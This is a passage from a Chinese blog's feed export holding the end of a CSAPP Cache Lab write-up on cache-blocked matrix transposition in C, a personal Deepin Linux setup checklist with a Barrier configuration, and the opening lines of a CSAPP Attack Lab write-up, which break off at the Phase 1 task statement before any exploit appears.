class="number">0</span>];</span><br><span class="line">                t1 = A[k][i + <span class="number">1</span>];</span><br><span class="line">                t2 = A[k][i + <span class="number">2</span>];</span><br><span class="line">                t3 = A[k][i + <span class="number">3</span>];</span><br><span class="line">                t4 = A[k][i + <span class="number">4</span>];</span><br><span class="line">                t5 = A[k][i + <span class="number">5</span>];</span><br><span class="line">                t6 = A[k][i + <span class="number">6</span>];</span><br><span class="line">                t7 = A[k][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line">                B[i + <span class="number">4</span>][k] = t4;</span><br><span class="line">                B[i + <span class="number">5</span>][k] = t5;</span><br><span class="line">                B[i + <span class="number">6</span>][k] = t6;</span><br><span class="line">                B[i + <span class="number">7</span>][k] = t7;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 第二种写法,但是存在对角线竞争</span></span><br><span class="line">                <span class="comment">// for (q = 0; q &lt; BSIZE; q++) // 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                <span class="comment">// &#123;</span></span><br><span class="line">                <span class="comment">//     B[i + q][k] = A[k][i + q];</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最终的miss数为287</strong>，在代码的注释部分，给出了miss的详细计算方式。</p><h3 id="2-61x67"><a href="#2-61x67" class="headerlink" title="2. 61x67"></a>2. 61x67</h3><p>64x64的最后来说，先把简单的说了来。</p><p>61和67看着不规则比较难，但是题目要求很松，只要低于2000miss即可。</p><p>依然是上面的算法，更改BSIZE, 经测试BSIZE=16就能满足要求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans6761_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">67</span>][<span class="number">61</span>], <span class="keyword">int</span> B[<span class="number">61</span>][<span class="number">67</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 从A矩阵视角</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 67</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BSIZE 16</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k, q;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += BSIZE) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += BSIZE) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + BSIZE; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; BSIZE; q++) <span class="comment">// 4. 以最小粒度为单位， 扫描一个条带</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (k &lt; M &amp;&amp; i + q &lt; N)</span><br><span class="line">                    &#123;</span><br><span class="line">                        B[i + q][k] = A[k][i + q];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> N</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> M</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BSIZE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>最终的miss为1817</strong></p><h3 id="3-64x64"><a href="#3-64x64" class="headerlink" title="3. 64x64"></a>3. 64x64</h3><p>64x64则难很多了，如果依然照搬上面的算法，最终的miss应该是1800多，离满分1300还差很远。来分析下原因：</p><ol><li>如果BSIZE 依然取8会发生什么问题？</li></ol><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d5b14195aa594514cfb.png" alt="image-20200729151739512"></p><p>上图给出了此时的矩阵内部cacheline分布，有个很严重的问题在于一个cache空间，在矩阵中仅4行就重复了。那如果条带继续为8， B列向扫描一个条带，后4个元素就会替换前4个元素所在的cacheline。造成过多<strong>冲突不命中</strong>。</p><ol start="2"><li>那，如果将BSIZE设置为4呢？</li></ol><p>实际上，采用同样的算法，BSIZE=4,的确是最优的了。但是设置为4又会带来什么缺点？<strong>cacheline的利用率仅有一半</strong>。 一个cacheline 32字节，可装载8个元素，但实际只是用了4个元素。</p><ol start="3"><li>那，如何保住利用率的同时，减少冲突不命中？</li></ol><p>要保住利用率，BSIZE应该是8的整数倍。但是冲突不命中如何解决？</p><p>以BSIZE=8为例：</p><p>A条带长度为8，我们将一个A条带的前4列正常填入B的前4行，而<strong>A条带的后4列填入到其他地方，</strong>再等待某个时机，将这些临时填充的数据归还到正确位置即可。示意图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d6b14195aa59451559a.png" alt="image-20200729153035966"></p><p>绿色代表正常填入区间。</p><p>灰色代表本应该填入，但是不填入，转而填入到红色区域。</p><p>红色区域代表临时填充区间。</p><p>接着，在某个时机：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d7d14195aa594515d89.png" alt="image-20200729153243973"></p><p>几个问题：</p><ol><li><p>为什么红色区域要横着填？</p><p>因为要考虑cache友好性，如果竖着填，那将跨越多个cacheline。</p></li><li><p>为什么要选择第0行，第4 5 6 7列 作为 第0列，第4 5 6 7行的临时区间？</p><p>这只是个示意图，实际上我选择了3种方案，最终方案不是这样映射的，贴这个图是为了方便理解。</p></li><li><p>某个时机？具体是什么时机？</p><p>将要填写第0行，第4,5,6,7列数据时，首先先移动数据到正确的位置（第0列，第4,5,6,7行），然后才填写第0行，第4，5,6,7列。</p></li><li><p>最靠右的块如何处理？它已经没有 右边的空间 作为缓冲了。</p><p>单独处理。具体之后会说。</p></li></ol><h4 id="最终方案"><a href="#最终方案" class="headerlink" title="最终方案"></a>最终方案</h4><p>最终我选择方案为： BSIZE=8，临时填充区间示意图如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f212d8c14195aa5945163a2.png" alt="image-20200729153935817"></p><p>为什么会这样选？如果像之前示意图那样选，依然会存在很多冲突映射，甚至不如不做映射。仔细分析了下trace file,手动模拟了cache line的load store过程，选择的这样的临时填充映射。</p><p><strong>最后再说说扫描到最后一个8x8的方格时如何处理</strong>，由于最后的方格右边已经没有空间做缓冲，那先考虑一个简单的，直接对A和B矩阵的最后8x8方格做一一映射。显然后4x8会把和前4x8会产生冲突不命中。</p><p>这样做的miss数应该是1500多。虽然比最开始的算法1800多，还是好不少，但依然没法满分。没办法，继续考虑。</p><p><strong>既然是后4x8和前4x8冲突了，那把两次赋值过程分开不就好了吗？</strong></p><p>是的，基于这样的思想，我改了代码，嗯，不错，<strong>这次跑的结果为1190</strong>。总算挤近1300了。</p><p>别忘了，依然要解决重复加载A条带带来的冲突不命中问题（即，多定义局部变量）。</p><p>最终代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans64_v1</span><span class="params">(<span class="keyword">int</span> A[<span class="number">64</span>][<span class="number">64</span>], <span class="keyword">int</span> B[<span class="number">64</span>][<span class="number">64</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 64</span></span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span> t0, t1, t2, t3, t4, t5, t6, t7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有循环视角从B矩阵出发</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LEN; i += <span class="number">8</span>) <span class="comment">// 1. 以block行为单位，扫描整个矩阵</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; LEN; j += <span class="number">8</span>) <span class="comment">// 2. 以一个block为单位，扫描一个block行</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = j; k &lt; j + <span class="number">8</span>; k++) <span class="comment">// 3. 以一个条带为单位，扫描一个块</span></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                t0 = A[k][i + <span class="number">0</span>];</span><br><span class="line">                t1 = A[k][i + <span class="number">1</span>];</span><br><span class="line">                t2 = A[k][i + <span class="number">2</span>];</span><br><span class="line">                t3 = A[k][i + <span class="number">3</span>];</span><br><span class="line">                t4 = A[k][i + <span class="number">4</span>];</span><br><span class="line">                t5 = A[k][i + <span class="number">5</span>];</span><br><span class="line">                t6 = A[k][i + <span class="number">6</span>];</span><br><span class="line">                t7 = A[k][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 第一块</span></span><br><span class="line">                    <span class="comment">// 前4个正常放置</span></span><br><span class="line">                    B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                    B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                    B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                    B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 后4个需要单独处理</span></span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">8</span>] = t4;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">9</span>] = t5;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">10</span>] = t6;</span><br><span class="line">                    B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">11</span>] = t7;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 非第一块，首先需要将元素搬迁到正确的位置</span></span><br><span class="line">                    <span class="keyword">if</span> (k == j) <span class="comment">// 第一次进入该块时，搬迁</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">size_t</span> a = i; a &lt; i + <span class="number">4</span>; a++)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">size_t</span> b = j; b &lt; j + <span class="number">4</span>; b++) <span class="comment">// 一个条带</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">// 两点关于一条直线对称</span></span><br><span class="line">                                B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">8</span>] = B[a][b];</span><br><span class="line">                                B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">4</span>] = B[a][b + <span class="number">4</span>];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 然后，填入本block正确的元素</span></span><br><span class="line">                    <span class="keyword">if</span> (j != LEN - <span class="number">8</span>)</span><br><span class="line">                    &#123; </span><br><span class="line">                        <span class="comment">// 中间块处理方式和第一块处理方式相同</span></span><br><span class="line">                        <span class="comment">// 前4个正常放置</span></span><br><span class="line">                        B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                        B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                        B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                        B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 后4个需要单独处理</span></span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">8</span>] = t4;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">9</span>] = t5;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">10</span>] = t6;</span><br><span class="line">                        B[i + k % <span class="number">4</span>][k - k % <span class="number">4</span> + <span class="number">11</span>] = t7;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 最后一块单独处理</span></span><br><span class="line">                        <span class="comment">// 只处理8x8的上 4x8方块</span></span><br><span class="line">                        B[i + <span class="number">0</span>][k] = t0;</span><br><span class="line">                        B[i + <span class="number">1</span>][k] = t1;</span><br><span class="line">                        B[i + <span class="number">2</span>][k] = t2;</span><br><span class="line">                        B[i + <span class="number">3</span>][k] = t3;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 补齐最后一块的下4行条带， 即最后的8x8的下4x8方块</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> a = <span class="number">56</span>; a &lt; <span class="number">64</span>; a++)</span><br><span class="line">        &#123;</span><br><span class="line">            t4 = A[a][i + <span class="number">4</span>];</span><br><span class="line">            t5 = A[a][i + <span class="number">5</span>];</span><br><span class="line">            t6 = A[a][i + <span class="number">6</span>];</span><br><span class="line">            t7 = A[a][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[i + <span class="number">4</span>][a] = t4;</span><br><span class="line">            B[i + <span class="number">5</span>][a] = t5;</span><br><span class="line">            B[i + <span class="number">6</span>][a] = t6;</span><br><span class="line">            B[i + <span class="number">7</span>][a] = t7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LEN</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你眼尖，会发现一个问题，那就是局部变量用了13个。好吧，确实是，but，我们是可以解决的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> a = i; a &lt; i + <span class="number">4</span>; a++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> b = j; b &lt; j + <span class="number">4</span>; b++) <span class="comment">// 一个条带</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 两点关于一条直线对称</span></span><br><span class="line">        B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">8</span>] = B[a][b];</span><br><span class="line">        B[b + i - j + <span class="number">4</span>][a - i + j - <span class="number">4</span>] = B[a][b + <span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把这个循环展开即可。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>呼，加上今天的文章，cachelab一共花了3天的时间，不过是完全值得的，能够深入理解经常碰到的cacheline的本质，理清了很多概念上的东西。 cache友好的代码确实很难想也很难写，以我目前的能力，写代码时还考虑不到这么底层，考虑一些时间、空间局部性就快极限了，每一行代码都去想cache line实在耗费很多精力，不得不说，还有很多路要走啊。</p><p>最近也要忙项目了，下一个lab不知道什么时候再做。但一定要把csapp啃完！</p>]]></content>
      
      
      <categories>
          
          <category> Csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cachelab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deepin安装后续事项记录</title>
      <link href="/archives/8134a50f.html"/>
      <url>/archives/8134a50f.html</url>
      
        <content type="html"><![CDATA[<p>manjaro是个人最喜欢的linux发行版，但是给我的台式机安装后，总是死机，无奈暂时转入deepin。</p><blockquote><p>后来发现manjaro死机，应该是给cpu超频的原因, 因为deepin也死机了，关闭超频后，一切正常，但是已经在deepin上安装好了各种环境，不想再更换回去。</p></blockquote><p>本文依然是自己给自己的备份。</p><a id="more"></a><p>安装流程：</p><ol><li><p>更新仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp;　sudo apt ugprade -y</span><br></pre></td></tr></table></figure></li><li><p>几个前提软件：vim ,google-chrome, fcitx-rime</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim google-chromme-stable fcitx-rime </span><br></pre></td></tr></table></figure><p>如果有fcitx-rime的备份，拉下备份即可，路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;.config&#x2F;fcitx&#x2F;rime</span><br></pre></td></tr></table></figure></li><li><p>zsh+oh-myz-zsh配置：<a href="https://www.ravenxrz.ink/archives/6c55eca4.html">https://www.ravenxrz.ink/archives/6c55eca4.html</a></p></li><li><p>electron–ssr，要使用chrome，得先同步一下，地址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FpbmdzaHVpc2l5dWFuL2VsZWN0cm9uLXNzci1iYWNrdXAvcmVsZWFzZXMvZG93bmxvYWQvdjAuMi42L2VsZWN0cm9uLXNzci0wLjIuNi5kZWI=" title="https://github.com/qingshuisiyuan/electron-ssr-backup/releases/download/v0.2.6/electron-ssr-0.2.6.deb">https://github.com/qingshuisiyuan/electron-ssr-backup/releases/download/v0.2.6/electron-ssr-0.2.6.deb<i class="fa fa-external-link"></i></span></p></li></ol><p>ok,有了这几个，后面就会容易很多。</p><p>openjdk , vscode， idea，clion，netease-clound-music, Persepolis, <strong>copyQ</strong>， barrier（两台物理机共用一套键鼠，个人目前台式机linux做开发，笔记本windows办公），wps（应急用）,tldr(快速查命令手册), gitkraken, okular(pdf阅读器)</p><p>自定义快捷键：</p><p>控制面板-&gt;键盘和语言-&gt;快捷键：</p><ul><li>截图–F2</li><li>终端雷神模式-F12</li></ul><h2 id="一些问题："><a href="#一些问题：" class="headerlink" title="一些问题："></a><strong>一些问题：</strong></h2><p><strong>fcitx开机候选字体过小：</strong></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f15095614195aa594196163.jpg"></p><p><strong>copyQ窗口显示快捷键设置：</strong></p><ol><li>打开copyQ应用程序</li><li>F6</li><li>添加</li><li>显示/隐藏主窗口</li><li>添加全局快捷键(Ctrl+`)， 和windows上的ditto保持一致。</li></ol><p>更多copyQ问题：<span class="exturl" data-url="aHR0cHM6Ly9jb3B5cS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvZmFxLmh0bWw=" title="https://copyq.readthedocs.io/en/latest/faq.html">https://copyq.readthedocs.io/en/latest/faq.html<i class="fa fa-external-link"></i></span></p><p><strong>deepin风扇声音巨大：</strong></p><p>windows下，我的台式机几乎是静音，但是deepin（也包括manjaro)风扇声音巨大。查看系统资源占用，cpu, memory, disk都很低，最终觉得可能是gpu的风扇问题，无法方便的查看gpu占用率，于是安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><p>安装这个软件包，会自动安装一些nvidia的模块，安装后重启，发现已经没有风扇声音了。</p><p><strong>开机自动的问题：</strong></p><p>有时候哦需要添加一些开机自动的软件或者脚本。这一点deepin做的还是相当不错的，对于gui的应用，可以通过 右键-&gt;添加到开机自启动来做。对于脚本，个人安装的的是zsh terminal，所以对应到.zshrc文件，可以直接在该文件中添加脚本，考虑到可维护性的问题，可以手动建立一个.myautostartup.sh脚本，然后在.zshrc文件中添加：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.myautostartup.sh</span><br></pre></td></tr></table></figure><p>以后所有的要开机自启动的脚本直接在myautostartup.sh添加即可。</p><p>额外说一下barriers的配置脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/barriers --no-tray --debug INFO --name raven-desktop-deepin --enable-crypto -c ~/.barrier_config --address :24800 </span><br></pre></td></tr></table></figure><p>.barrier_config文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">section: screens</span><br><span class="line">raven-desktop-deepin:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">raven-laptop-win:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">raven-laptop-manjaro:</span><br><span class="line">halfDuplexCapsLock &#x3D; false</span><br><span class="line">halfDuplexNumLock &#x3D; false</span><br><span class="line">halfDuplexScrollLock &#x3D; false</span><br><span class="line">xtestIsXineramaUnaware &#x3D; false</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: aliases</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: links</span><br><span class="line">raven-desktop-deepin:</span><br><span class="line">right &#x3D; raven-laptop-win</span><br><span class="line">raven-laptop-win:</span><br><span class="line">left &#x3D; raven-desktop-deepin</span><br><span class="line">down &#x3D; raven-laptop-manjaro</span><br><span class="line">raven-laptop-manjaro:</span><br><span class="line">up &#x3D; raven-laptop-win</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">section: options</span><br><span class="line">relativeMouseMoves &#x3D; false</span><br><span class="line">screenSaverSync &#x3D; true</span><br><span class="line">win32KeepForeground &#x3D; false</span><br><span class="line">clipboardSharing &#x3D; true</span><br><span class="line">switchCorners &#x3D; none </span><br><span class="line">switchCornerSize &#x3D; 0</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>qt creator高分屏显示问题</strong></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f150c1114195aa5941a289e.jpg"></p><p><strong>vim，ideavim，qtvim配置</strong></p><p>terminal的vim，采用：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtaXgvdmltcmM=" title="https://github.com/amix/vimrc">https://github.com/amix/vimrc<i class="fa fa-external-link"></i></span> 配置</p><p>ideavim和qtvim采用：<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vcmF2ZW54cnovZGJhOGRkMGMxZWJhNGJiMDM5ZjAwOGY1Njg2N2UwODM=" title="https://gist.github.com/ravenxrz/dba8dd0c1eba4bb039f008f56867e083">https://gist.github.com/ravenxrz/dba8dd0c1eba4bb039f008f56867e083<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Csapp-Attacklab题解</title>
      <link href="/archives/f81059da.html"/>
      <url>/archives/f81059da.html</url>
      
        <content type="html"><![CDATA[<p>csapp lab系列：</p><ul><li><a href="https://www.ravenxrz.ink/archives/2d758396.html">Csapp-Datalab 详解</a></li><li><a href="https://www.ravenxrz.ink/archives/7915569e.html">Csapp-Bomblab 题解</a></li></ul><p>本次lab: Attacklab</p><p>耽误了整整一个月没有做csapp的lab了. 忙着返校,忙着实验室的东西, 今天抽了点时间,总算是完成了第三个实验.</p><p>下面就记录下题解分析吧.</p><a id="more"></a><h2 id="0-背景知识"><a href="#0-背景知识" class="headerlink" title="0. 背景知识"></a>0. 背景知识</h2><ol><li>程序的内存分布,,内存分布<a href="https://www.ravenxrz.ink/archives/2567fa35.html">https://www.ravenxrz.ink/archives/2567fa35.html</a></li><li>函数调用的过程, 主要要知道call和ret指令各自的工作. </li><li>gdb调试,objdump反汇编</li><li>Buffer Overflow以及常用的阻止buffer overflow的方法</li><li>ROP攻击</li></ol><p>其中,最重要的是,一定要了解stack frame的call和ret过程.</p><h2 id="1-Phase-1"><a href="#1-Phase-1" class="headerlink" title="1. Phase 1"></a>1. Phase 1</h2><p>题目就给英文了</p><p>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure. Function getbuf is called within CTARGET by a function test having the following C code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 